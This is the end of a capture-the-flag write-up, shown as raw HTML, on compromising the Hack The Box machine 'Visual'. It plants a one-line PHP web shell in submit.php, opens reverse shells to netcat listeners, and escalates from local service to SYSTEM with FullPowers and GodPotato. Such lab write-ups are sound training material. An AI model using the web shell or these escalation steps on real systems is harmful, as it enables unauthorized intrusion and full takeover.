<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span>
</pre></div>
<p>The processes that don't display any user in the <code>Owners</code> column are processes that aren't running as <code>enox</code>. This is due to Windows not allowing us to retrieve all process info without administrator privileges.</p><br/>
<p>As evident, the <code>httpd</code> process is not running as <code>enox</code>. Therefore, with file modification privileges in the website folder, we could potentially achieve code execution as the process owner, given that it utilizes PHP.</p><br/>
<p>I will modify the <code>submit.php</code> file:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span> <span class="nb">dir</span>


    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span>


<span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>                                                                  
<span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>                                                                  
<span class="n">d</span><span class="o">-----</span>        <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">32</span> <span class="n">AM</span>                <span class="n">assets</span>                                                                
<span class="n">d</span><span class="o">-----</span>        <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">32</span> <span class="n">AM</span>                <span class="n">css</span>                                                                   
<span class="n">d</span><span class="o">-----</span>        <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">32</span> <span class="n">AM</span>                <span class="n">js</span>                                                                    
<span class="n">d</span><span class="o">-----</span>        <span class="mi">2</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2024</span>   <span class="mi">3</span><span class="p">:</span><span class="mi">08</span> <span class="n">AM</span>                <span class="n">uploads</span>                                                               
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>   <span class="mi">6</span><span class="p">:</span><span class="mi">20</span> <span class="n">PM</span>           <span class="mi">7534</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>                                                             
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">2</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2024</span>   <span class="mi">3</span><span class="p">:</span><span class="mi">24</span> <span class="n">AM</span>           <span class="mi">1560</span> <span class="n">submit</span><span class="o">.</span><span class="n">php</span>                                                            
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">6</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>   <span class="mi">4</span><span class="p">:</span><span class="mi">11</span> <span class="n">PM</span>           <span class="mi">4970</span> <span class="n">vs_status</span><span class="o">.</span><span class="n">php</span>                                                         


<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span>
</pre></div>
<p>I kept the file identical to its original state; I simply appended the following lines at the beginning of the file (inside the PHP tag):</p><br/>
<div class="highlight"><pre><span></span><span class="err">$</span><span class="n">cmd</span> <span class="o">=</span> <span class="n">system</span><span class="p">(</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span>
<span class="n">echo</span> <span class="err">$</span><span class="n">cmd</span><span class="p">;</span>
</pre></div>
<p>Now, when accessing it through my browser, it will display the following message:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/16.png"/></p><br/>
<p>It means that our code is being interpreted correctly, and we can achieve command execution:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/17.png"/></p><br/>
<p>We have achieved command execution as <code>nt authority\local service</code>, so let's attempt to obtain a reverse shell as that user. Firstly, I will setup my netcat listener on port 3001:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">rlwrap</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="mi">3001</span>
</pre></div>
<p>Now, I will reuse the webshell I used earlier from revshells.</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/medium/visual/img/18.png"/></p><br/>
<p>Finally, I have received the reverse shell.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">rlwrap</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
<span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="mi">3001</span>
<span class="n">Connection</span> <span class="n">received</span> <span class="n">on</span> <span class="mf">10.10.11.234</span> <span class="mi">49683</span>

<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span> <span class="n">whoami</span>
<span class="n">nt</span> <span class="n">authority</span>\<span class="n">local</span> <span class="n">service</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span>
</pre></div>
<p>As <code>local service</code>, we lack interesting token privileges:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="o">/</span><span class="n">priv</span>

<span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
<span class="o">----------------------</span>

<span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                    <span class="n">State</span>   
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">========</span>
<span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>       <span class="n">Enabled</span> 
<span class="n">SeCreateGlobalPrivilege</span>       <span class="n">Create</span> <span class="k">global</span> <span class="n">objects</span>          <span class="n">Enabled</span> 
<span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="n">process</span> <span class="n">working</span> <span class="nb">set</span> <span class="n">Disabled</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">xampp</span>\<span class="n">htdocs</span><span class="o">&gt;</span>
</pre></div>
<h3>Give Me Back My Privileges! Please?</h3><br/>
<p>While exploring potential privilege escalation vectors as <code>local service</code>, I came across an <a href="https://itm4n.github.io/localservice-privileges/">interesting article</a> discussing privileges associated with <code>nt authority\local service</code>. It demonstrates how to recover all privileges of the <code>local service</code> account, including the potential for privilege escalation.</p><br/>
<p>I observed that creating scheduled tasks allows you to regain all privileges. However, to restore the <code>SeImpersonatePrivilege</code>, you need to include specific specifications during the task registration. It is necessary to specify certain principals to recover this privilege.</p><br/>
<p>The author of the article has developed a potential tool to automate this process. I uploaded the compiled binary from the <a href="https://github.com/itm4n/FullPowers/releases/">release page</a> to the victim machine:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">FullPowers</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">h</span>

<span class="n">FullPowers</span> <span class="n">v0</span><span class="mf">.1</span> <span class="p">(</span><span class="n">by</span> <span class="nd">@itm4n</span><span class="p">)</span>

  <span class="n">This</span> <span class="n">tool</span> <span class="n">leverages</span> <span class="n">the</span> <span class="n">Task</span> <span class="n">Scheduler</span> <span class="n">to</span> <span class="n">recover</span> <span class="n">the</span> <span class="n">default</span> <span class="n">privilege</span> <span class="nb">set</span> <span class="n">of</span> <span class="n">a</span> <span class="n">service</span> <span class="n">account</span><span class="o">.</span>
  <span class="n">For</span> <span class="n">more</span> <span class="n">information</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">itm4n</span><span class="o">.</span><span class="n">github</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">localservice</span><span class="o">-</span><span class="n">privileges</span><span class="o">/</span>

<span class="n">Optional</span> <span class="n">arguments</span><span class="p">:</span>
  <span class="o">-</span><span class="n">v</span>              <span class="n">Verbose</span> <span class="n">mode</span><span class="p">,</span> <span class="n">used</span> <span class="k">for</span> <span class="n">debugging</span> <span class="n">essentially</span>
  <span class="o">-</span><span class="n">c</span> <span class="o">&lt;</span><span class="n">CMD</span><span class="o">&gt;</span>        <span class="n">Custom</span> <span class="n">command</span> <span class="n">line</span> <span class="n">to</span> <span class="n">execute</span> <span class="p">(</span><span class="n">default</span> <span class="ow">is</span> <span class="s1">'C:\Windows\System32\cmd.exe'</span><span class="p">)</span>
  <span class="o">-</span><span class="n">x</span>              <span class="n">Try</span> <span class="n">to</span> <span class="n">get</span> <span class="n">the</span> <span class="n">extended</span> <span class="nb">set</span> <span class="n">of</span> <span class="n">privileges</span> <span class="p">(</span><span class="n">might</span> <span class="n">fail</span> <span class="k">with</span> <span class="n">NETWORK</span> <span class="n">SERVICE</span><span class="p">)</span>
  <span class="o">-</span><span class="n">z</span>              <span class="n">Non</span><span class="o">-</span><span class="n">interactive</span><span class="p">,</span> <span class="n">create</span> <span class="n">a</span> <span class="n">new</span> <span class="n">process</span> <span class="ow">and</span> <span class="n">exit</span> <span class="p">(</span><span class="n">default</span> <span class="ow">is</span> <span class="s1">'interact with the new process'</span><span class="p">)</span>

<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span>
</pre></div>
<p>Upon examining the help panel, it is evident that it allows you to execute a command using the <code>-c</code> parameter. Let's attempt to run <code>whoami /priv</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">FullPowers</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">c</span> <span class="s2">"whoami /priv"</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Started</span> <span class="n">dummy</span> <span class="n">thread</span> <span class="k">with</span> <span class="nb">id</span> <span class="mi">2208</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">created</span> <span class="n">scheduled</span> <span class="n">task</span><span class="o">.</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Got</span> <span class="n">new</span> <span class="n">token</span><span class="err">!</span> <span class="n">Privilege</span> <span class="n">count</span><span class="p">:</span> <span class="mi">7</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">CreateProcessAsUser</span><span class="p">()</span> <span class="n">OK</span>

<span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
<span class="o">----------------------</span>

<span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                               <span class="n">State</span>  
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">=======</span>
<span class="n">SeAssignPrimaryTokenPrivilege</span> <span class="n">Replace</span> <span class="n">a</span> <span class="n">process</span> <span class="n">level</span> <span class="n">token</span>             <span class="n">Enabled</span>
<span class="n">SeIncreaseQuotaPrivilege</span>      <span class="n">Adjust</span> <span class="n">memory</span> <span class="n">quotas</span> <span class="k">for</span> <span class="n">a</span> <span class="n">process</span>        <span class="n">Enabled</span>
<span class="n">SeAuditPrivilege</span>              <span class="n">Generate</span> <span class="n">security</span> <span class="n">audits</span>                  <span class="n">Enabled</span>
<span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>                  <span class="n">Enabled</span>
<span class="n">SeImpersonatePrivilege</span>        <span class="n">Impersonate</span> <span class="n">a</span> <span class="n">client</span> <span class="n">after</span> <span class="n">authentication</span> <span class="n">Enabled</span>
<span class="n">SeCreateGlobalPrivilege</span>       <span class="n">Create</span> <span class="k">global</span> <span class="n">objects</span>                     <span class="n">Enabled</span>
<span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="n">process</span> <span class="n">working</span> <span class="nb">set</span>            <span class="n">Enabled</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span>
</pre></div>
<p>Great! Subsequently, I sent a reverse shell to my attacker machine and gained access to the system with all these privileges.</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="o">/</span><span class="n">priv</span>

<span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
<span class="o">----------------------</span>

<span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                               <span class="n">State</span>  
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">=======</span>
<span class="n">SeAssignPrimaryTokenPrivilege</span> <span class="n">Replace</span> <span class="n">a</span> <span class="n">process</span> <span class="n">level</span> <span class="n">token</span>             <span class="n">Enabled</span>
<span class="n">SeIncreaseQuotaPrivilege</span>      <span class="n">Adjust</span> <span class="n">memory</span> <span class="n">quotas</span> <span class="k">for</span> <span class="n">a</span> <span class="n">process</span>        <span class="n">Enabled</span>
<span class="n">SeAuditPrivilege</span>              <span class="n">Generate</span> <span class="n">security</span> <span class="n">audits</span>                  <span class="n">Enabled</span>
<span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>                  <span class="n">Enabled</span>
<span class="n">SeImpersonatePrivilege</span>        <span class="n">Impersonate</span> <span class="n">a</span> <span class="n">client</span> <span class="n">after</span> <span class="n">authentication</span> <span class="n">Enabled</span>
<span class="n">SeCreateGlobalPrivilege</span>       <span class="n">Create</span> <span class="k">global</span> <span class="n">objects</span>                     <span class="n">Enabled</span>
<span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="n">process</span> <span class="n">working</span> <span class="nb">set</span>            <span class="n">Enabled</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span>
</pre></div>
<h3>Shell as administrator</h3><br/>
<p>As we possess the <code>SeImpersonatePrivilege</code> token, we can elevate our privilege using tools such as <code>JuicyPotatoNG</code> and others.</p><br/>
<p>As outlined on <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#seimpersonateprivilege">HackTricks</a>, any process with this privilege can impersonate (although not create) any token, given that it acquires a handle to the token. By inducing a Windows service (DCOM) to undergo NTLM authentication through an exploit, it becomes possible to obtain an elevated token, enabling the execution of a process with SYSTEM privileges.</p><br/>
<p>To attain execution with system privileges, I will utilize <a href="https://github.com/BeichenDream/GodPotato">GodPotato</a>, specifically opting for the release version <code>GodPotato-NET4.exe</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">GodPotato</span><span class="o">-</span><span class="n">NET4</span><span class="o">.</span><span class="n">exe</span> 
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Arguments</span><span class="p">:</span>

    <span class="o">-</span><span class="n">cmd</span> <span class="n">Required</span><span class="p">:</span><span class="kc">True</span> <span class="n">CommandLine</span> <span class="p">(</span><span class="n">default</span> <span class="n">cmd</span> <span class="o">/</span><span class="n">c</span> <span class="n">whoami</span><span class="p">)</span>

<span class="n">Example</span><span class="p">:</span>

<span class="n">GodPotato</span> <span class="o">-</span><span class="n">cmd</span> <span class="s2">"cmd /c whoami"</span> 
<span class="n">GodPotato</span> <span class="o">-</span><span class="n">cmd</span> <span class="s2">"cmd /c whoami"</span> 

<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span>
</pre></div>
<p>Let's execute the example command:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">GodPotato</span><span class="o">-</span><span class="n">NET4</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">cmd</span> <span class="s2">"cmd /c whoami"</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CombaseModule</span><span class="p">:</span> <span class="mh">0x140703919112192</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DispatchTable</span><span class="p">:</span> <span class="mh">0x140703921418352</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">UseProtseqFunction</span><span class="p">:</span> <span class="mh">0x140703920794528</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">UseProtseqFunctionParamCount</span><span class="p">:</span> <span class="mi">6</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">HookRPC</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Start</span> <span class="n">PipeServer</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trigger</span> <span class="n">RPCSS</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CreateNamedPipe</span> \\<span class="o">.</span>\<span class="n">pipe</span>\<span class="n">b942aac4</span><span class="o">-</span><span class="n">eadc</span><span class="o">-</span><span class="mi">4</span><span class="n">a0c</span><span class="o">-</span><span class="n">bbec</span><span class="o">-</span><span class="mi">27</span><span class="n">cec7d201bb</span>\<span class="n">pipe</span>\<span class="n">epmapper</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">GUID</span><span class="p">:</span> <span class="mi">00000000</span><span class="o">-</span><span class="mi">0000</span><span class="o">-</span><span class="mi">0000</span><span class="o">-</span><span class="n">c000</span><span class="o">-</span><span class="mi">000000000046</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">IPID</span><span class="p">:</span> <span class="mf">0000e002</span><span class="o">-</span><span class="mi">10</span><span class="n">d0</span><span class="o">-</span><span class="n">ffff</span><span class="o">-</span><span class="mi">0</span><span class="n">b6d</span><span class="o">-</span><span class="mi">1</span><span class="n">c22af0a9d8d</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">OXID</span><span class="p">:</span> <span class="mh">0xe30faeb47a4b53b4</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">OID</span><span class="p">:</span> <span class="mh">0xe8c549bcce717025</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">Flags</span><span class="p">:</span> <span class="mh">0x281</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">PublicRefs</span><span class="p">:</span> <span class="mh">0x0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Marshal</span> <span class="n">Object</span> <span class="nb">bytes</span> <span class="nb">len</span><span class="p">:</span> <span class="mi">100</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">UnMarshal</span> <span class="n">Object</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Pipe</span> <span class="n">Connected</span><span class="err">!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CurrentUser</span><span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">NETWORK</span> <span class="n">SERVICE</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CurrentsImpersonationLevel</span><span class="p">:</span> <span class="n">Impersonation</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Start</span> <span class="n">Search</span> <span class="n">System</span> <span class="n">Token</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">PID</span> <span class="p">:</span> <span class="mi">888</span> <span class="n">Token</span><span class="p">:</span><span class="mh">0x644</span>  <span class="n">User</span><span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">SYSTEM</span> <span class="n">ImpersonationLevel</span><span class="p">:</span> <span class="n">Impersonation</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Find</span> <span class="n">System</span> <span class="n">Token</span> <span class="p">:</span> <span class="kc">True</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">UnmarshalObject</span><span class="p">:</span> <span class="mh">0x80070776</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CurrentUser</span><span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">SYSTEM</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">process</span> <span class="n">start</span> <span class="k">with</span> <span class="n">pid</span> <span class="mi">1684</span>
<span class="n">nt</span> <span class="n">authority</span>\<span class="n">system</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span>
</pre></div>
<p>As you can see, we have achieved command execution as <code>system</code>. Once again, I sent a <a href="https://www.revshells.com/">reverse shell</a> to my attacker machine.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">rlwrap</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">4444</span>
<span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="mi">4444</span>
<span class="n">Connection</span> <span class="n">received</span> <span class="n">on</span> <span class="mf">10.10.11.234</span> <span class="mi">49689</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">whoami</span>
<span class="n">nt</span> <span class="n">authority</span>\<span class="n">system</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span>
</pre></div>
<p>Finally, we can read <code>root.txt</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">users</span>\<span class="n">administrator</span>\<span class="n">desktop</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
<span class="mi">05</span><span class="n">b4a</span><span class="o">**********************</span><span class="mf">485e7</span>
<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">users</span>\<span class="n">administrator</span>\<span class="n">desktop</span><span class="o">&gt;</span>
</pre></div>
            </div>
        </div>
    </section>

    <script src="/js/sidebarToggle.js"></script>
    <script src="/js/fixMobileImages.js"></script>
    <footer>
        <p>&copy; 2024 elswix.github.io</p>
    </footer>
</body>
</html>
